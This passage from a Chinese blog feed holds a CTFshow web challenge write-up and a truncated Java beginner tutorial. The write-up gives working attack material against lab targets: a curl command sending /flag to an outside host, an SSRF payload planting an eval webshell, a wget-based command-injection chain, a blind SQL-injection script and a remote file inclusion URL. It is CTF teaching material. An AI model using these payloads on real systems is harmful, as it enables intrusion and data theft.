punctuation">\</span>'<span class="token string">' -F file=@/flag'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接带出文件</p><p><strong>689</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This is a waf!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"console.log(<span class="token interpolation"><span class="token variable">$path</span></span> update successed!)"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello.CTFshow"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里在path位置没有过滤，也就是说不管我们在path位置写入什么都会原封不动的返回，所以此时我们让docker访问自己，在path处传入木马即可</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;%26path&#x3D;%3C?php%20eval($_POST[1]);?%3E&amp;path&#x3D;b.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>690</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\w+$/'</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sorry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./ '</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的命令中只能有字母和数字，执行命令可用换行绕过，问题是我们要如何构造命令来执行，首先因为没有回显，所以直接执行是行不通的，那可以尝试写一个文件，构造一个服务器返回内容为一句话木马的脚本</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造如下命令</p><pre class="line-numbers language-none"><code class="language-none">mkdir acd awget 10进制服务器IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时a文件夹下就有一个index.html内容为一句话木马，但是我们还没办法执行，此时我们利用tar来将文件类型进行更改</p><pre class="line-numbers language-none"><code class="language-none">tar cvf shell a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将a文件夹打包成一个shell文件就可以执行了</p><p><strong>691</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span>   <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$filterlist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/\(|\)|username|password|where|      case|when|like|regexp|into|limit|=|for|;/"</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filterlist</span><span class="token punctuation">,</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input username!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from admin where  username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password = '<span class="token interpolation"><span class="token variable">$password</span></span>' "</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span> <span class="token operator">-></span> <span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The content in the password column is the flag!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order by盲注，贴个<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/miuzzx/article/details/104908543" >链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，原理就是通过password位置的字符串的比较导致回显中username的内容不同来判断结果，直接写脚本吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflagstr<span class="token operator">=</span><span class="token string">"-01234567890abcdefghiostw&#123;&#125;---"</span>url<span class="token operator">=</span><span class="token string">"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>flagstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"'or 1 union select 1,2,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">' order by 3#"</span></span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"&lt;/code>admin"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>692</strong></p><p>看一下preg_replace函数的用法</p><blockquote>        <h1 id="preg-replace"   >          <a href="#preg-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h1>      <p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>preg_replace — 执行一个正则表达式的搜索和替换</p>        <h3 id="说明"   >          <a href="#说明" class="heading-link"><i class="fas fa-link"></i></a><a href="#说明" class="headerlink" title="说明"></a>说明</h3>      <pre class="line-numbers language-none"><code class="language-none">preg_replace(  string|array $pattern,  string|array $replacement,  string|array $subject,  int $limit &#x3D; -1,  int &amp;$count &#x3D; null): string|array|null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p><pre class="line-numbers language-none"><code class="language-none">replacement<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用于替换的字符串或字符串数组。如果这个参数是一个字符串，并且 <code>pattern</code> 是一个数组，那么所有的模式都使用这个字符串进行替换。如果 <code>pattern</code> 和 <code>replacement</code> 都是数组，每个 <code>pattern</code> 使用 <code>replacement</code>中对应的元素进行替换。如果 <code>replacement</code> 中的元素比 <code>pattern</code> 中的少，多出来的 <code>pattern</code> 使用空字符串进行替换。</p><p><code>replacement</code> 中可以包含后向引用 <code>\\n</code> 或 <code>$n</code>，语法上首选后者。 每个这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是0-99，<code>\\0</code> 和 <code>$0</code> 代表完整的模式匹配文本。捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在 <code>replacement</code> 中使用反斜线，必须使用 4 个(<code>&quot;\\\\&quot;</code>，译注：因为这首先是 PHP 的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。</p></blockquote><p>此处如果将replacement中内容放入<code>\\0</code>那么就会直接匹配前面pattern中的结果</p><blockquote><p>preg_replace中的第二个参数如果是%00也就是ascii中的0,那么将会匹配到整个字符串。<br>比如初始的字符串为<br>$option=’123’;<br>如果执行<br>preg_replace(“$option=’.*’;”,”\x00”,$a)<br>那么返回的结果是<br>$option=’$option=’123’;’;<br>其实就是把原来的字符串又放到单引号里面了。<br>假设我们第一次传option=;phpinfo();//<br>首先config.php中的内容会被替换成$option=’;phpinfo();//‘。<br>如果我们第二次传option=%00<br>那么最终的结果是$option=’$option=’;phpinfo();//‘’<br>这样就逃出了单引号，phpinfo()也就执行成功<br>————————————————<br>版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/miuzzx/article/details/122998220" >https://blog.csdn.net/miuzzx/article/details/122998220</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p><strong>693</strong></p><p>extract函数加远程文件包含</p><pre class="line-numbers language-none"><code class="language-none">?function&#x3D;extract&amp;file&#x3D;http:&#x2F;&#x2F;45.15.131.101&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>694</strong></p><p>构造X-Forwarded-For请求头为文件名，file为.即可直接写入到请求头所构造的文件名中</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>695</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java入门</title>
      <link href="/posts/63f03572.html"/>
      <url>/posts/63f03572.html</url>
      
        <content type="html"><![CDATA[        <h1 id="JAVA"   >          <a href="#JAVA" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1>      <p><strong>Hello World!</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Main.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//javac Main.java</span><span class="token comment">//java Main</span><span class="token comment">//JDK 11以后支持直接使用java执行源代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>JDK（Java开发工具包）组成</strong></p><ul><li>JVM：Java虚拟机，java程序运行的地方</li><li>核心类库：Java自带类，供程序员调用</li><li>JRE：Java运行环境</li></ul><p><strong>数据类型</strong></p><p>基本数据类型</p><ul><li>整数<ul><li>byte    1字节</li><li>short    2字节</li><li>int（默认）    4字节</li><li>long    8字节（整数定义时需要在数字末尾加L）</li></ul></li><li>浮点数<ul><li>float    4字节（定义时需要在数字末尾加F）</li><li>double（默认）    8字节</li></ul></li><li>字符：char 2字节</li><li>布尔：boolen</li></ul><p>引用数据类型</p><p><strong>类型转换</strong></p><p>默认类型转换，小的自动换成大的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">byte</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">byte</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//此处程序报错，因为ab在进行加运算前已经执行被转换成int类型</span><span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//此处正确</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>运算符</strong></p><p>和C++一样，字符串的优先级拉满</p><p><strong>Java原生API</strong></p><p><span class="exturl"><a class="exturl__link"   href="https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html" >官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>Java用户输入（练习系统API使用）</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token comment">//导入Scanner包</span><span class="token keyword">public</span> <span class="token keyword">class</span> scannerDemo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Scanner</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个Scanner对象</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"请输入您的年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> age<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取Scanner得到的内容</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"您的年龄是："</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>程序流程控制</strong></p><p>if，switch，for，while和C++完全一致</p><p><strong>Random包</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> randomDemo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Random</span> r<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> shu<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0-9范围</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数组</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//静态初始化数组</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PSR"</span><span class="token punctuation">,</span><span class="token string">"ZYL"</span><span class="token punctuation">,</span><span class="token string">"HZJ"</span><span class="token punctuation">&#125;</span><span class="token comment">//动态初始化数组</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态初始化数组默认值：</p><p>整型：0</p><p>浮点型：0.0</p><p>布尔：false</p><p>引用类型：null</p><p><strong>方法（就函数啦）</strong></p><p>完整定义格式：</p><pre class="line-numbers language-none"><code class="language-none">修饰符 返回值类型 方法名(形参)&#123;    方法体代码    return 返回值;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"您求的和为："</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他定义格式：</p><p>可以没有返回值（void），没有参数</p><p><strong>方法数据传递机制</strong></p><p>基本类型参数传递：传值</p><p>引用类型参数传递：传地址</p><p><strong>方法重载</strong></p><p>方法名一样参数不一样的方法</p><p><strong>类</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow<span class="token punctuation">.</span></span><span class="token constant">OP</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> brand<span class="token punctuation">;</span>    <span class="token keyword">double</span> price<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"欢迎使用"</span><span class="token operator">+</span>brand<span class="token operator">+</span><span class="token string">"手机"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//构造器写法与C++相同</span><span class="token comment">//this关键在代表当前对象的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>JavaBean</strong></p><p>也被称作实体类，其对象可用于在程序中封装数据</p><p>要求：</p><ul><li>成员变量用private修饰</li><li>提供对应成员变量的get与set方法</li><li>必须有一个无参构造器，有参构造可有可无</li></ul><p><strong>String类</strong></p><p>不可变：指原始字符串不可变，经过+运算后产生新的字符串</p><p>创建方式</p><pre class="line-numbers language-none"><code class="language-none">String s&#x3D;new String(&quot;flag&quot;);char[] chars&#x3D;&#123;&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;&#125;;String s&#x3D;new String(chars);byte[] bytes&#x3D;&#123;102,108,97,103&#125;String s&#x3D;new String(bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>String常用API</strong></p><pre class="line-numbers language-none"><code class="language-none">s1.equals(s2)&#x2F;&#x2F;比较s1，s2字符串内容是否相同equalsIgnoreCase忽略大小写s1.charAt(Index)&#x2F;&#x2F;获取Index位置的字符s1.toCharArray()&#x2F;&#x2F;将字符串转换为char数组s1.substring(head,end)&#x2F;&#x2F;截取字符串s1.replace(target,replacement)&#x2F;&#x2F;将字符串中的target用replacement替换s1.contains(s)&#x2F;&#x2F;字符串中是否包含s字符串s1.startWiths(s)&#x2F;&#x2F;字符串是否以s字符串开始s1.spilt(s)&#x2F;&#x2F;以s为分割符来将字符串切割<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ArrayList</strong></p><pre class="line-numbers language-none"><code class="language-none">ArrayList list&#x3D;new 